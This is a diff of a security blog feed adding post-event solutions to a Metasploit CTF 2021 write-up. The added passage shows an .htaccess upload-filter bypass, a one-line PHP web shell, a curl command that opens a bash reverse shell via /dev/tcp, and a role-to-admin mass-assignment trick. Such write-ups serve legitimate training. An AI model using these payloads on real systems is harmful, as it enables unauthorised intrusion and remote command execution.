@@ -143,10 +143,47 @@ page.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/3ofhearts.png" class="center" style="border-radius: 8px;" />
 &lt;p>&lt;strong>Reference:&lt;/strong>&lt;/p>
 &lt;p>&lt;code>https://regilero.github.io/english/security/2019/10/17/security_apache_traffic_server_http_smuggling/&lt;/code>&lt;/p>
+&lt;h2 id="post-ctf-solutions">Post CTF Solutions&lt;/h2>
+&lt;p>Solutions to challenges I figured out after the CTF ended.&lt;/p>
+&lt;h3 id="9-of-spades">9 of Spades&lt;/h3>
+&lt;p>This challenge was on port 20055. The objective was to bypass the filter in place for uploading a file we can
+execute php code.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ctf-33.png" class="center" style="border-radius: 8px;" />
+&lt;p>We can upload .htaccess file that specifies any extension of our choosing to execute php code.&lt;/p>
+&lt;p>In the below screenshot I intercept the upload request using burp and modify the request. The .htaccess file has the
+below content that enables a file with .mike extension to be executed as a php file.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">AddType application/x-httpd-php .mike
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ctf-34.png" class="center" style="border-radius: 8px;" />
+&lt;p>Now I uploaded a file with the following php code that executes system commands.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#a6e22e">system&lt;/span>($_REQUEST[&lt;span style="color:#e6db74">&amp;#39;cmd&amp;#39;&lt;/span>]);&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ctf-35.png" class="center" style="border-radius: 8px;" />
+&lt;p>Using this curl command we get a reverse shell.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">curl -G --data-urlencode &lt;span style="color:#e6db74">&amp;#34;cmd=/bin/bash -c &amp;#39;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/172.17.6.180/53 0&amp;gt;&amp;amp;1 &amp;amp;&amp;#39;&amp;#34;&lt;/span> http://172.17.6.181:20055/file_uploads/execute.mike
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ctf-36.png" class="center" style="border-radius: 8px;" />
+&lt;p>With the shell we can copy the flag to the uploads location to download it from the browser.&lt;/p>
+&lt;p>&lt;strong>Flag:&lt;/strong>&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/9ofspades.png" class="center" style="border-radius: 8px;" />
+&lt;h3 id="4-of-diamonds">4 of Diamonds&lt;/h3>
+&lt;p>This challenge was on port 10010. When we load it on the browser we get the following app.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ctf-37.png" class="center" style="border-radius: 8px;" />
+&lt;p>After creating an account the account information is stored in the response in a script tag.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ctf-38.png" class="center" style="border-radius: 8px;" />
+&lt;p>All these parameters are those provided during registration. We can try to manipulate the role from user to admin.&lt;/p>
+&lt;p>During registration I intercepted the request with burp and added role as admin.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ctf-39.png" class="center" style="border-radius: 8px;" />
+&lt;p>We then get access to the admin panel that has the flag.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ctf-40.png" class="center" style="border-radius: 8px;" />
+&lt;p>&lt;strong>Flag:&lt;/strong>&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/4ofdiamonds.png" class="center" style="border-radius: 8px;" />
 &lt;h2 id="conclusion">Conclusion&lt;/h2>
 &lt;p>Some great new challenges this year and definitely more challenging. Looking forward to next year&amp;rsquo;s CTF.&lt;/p>
 &lt;p>The last challenge definitely made me feel like I need to get back to Web Security Academy.&lt;/p>
-&lt;p>If you have any questions or feedback feel free to reach out&lt;/p></content></item><item><title>SheHacksKE HackFest 2021 CTF WriteUp</title><link>https://blog.ikuamike.io/posts/2021/hackfest-2021-ctf/</link><pubDate>Thu, 11 Nov 2021 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2021/hackfest-2021-ctf/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/shehacks-hackfest-2021/scoreboard.png" class="center" style="border-radius: 8px;" />
+&lt;p>If you have any questions or feedback feel free to reach out.&lt;/p>
+&lt;p>Another writeup you can read:&lt;/p>
+&lt;p>&lt;a href="https://ufo.stealien.com/2021-12-07/Metasploit-CTF-Review">https://ufo.stealien.com/2021-12-07/Metasploit-CTF-Review&lt;/a>&lt;/p></content></item><item><title>SheHacksKE HackFest 2021 CTF WriteUp</title><link>https://blog.ikuamike.io/posts/2021/hackfest-2021-ctf/</link><pubDate>Thu, 11 Nov 2021 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2021/hackfest-2021-ctf/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/shehacks-hackfest-2021/scoreboard.png" class="center" style="border-radius: 8px;" />
 &lt;h2 id="introduction">Introduction&lt;/h2>
 &lt;p>&lt;a href="https://twitter.com/shehacks_ke" target="_blank" rel="noopener">@SheHacksKE&lt;/a>
 held their yearly hackfest event in October 2021 but it was online this year. The event included a CTF
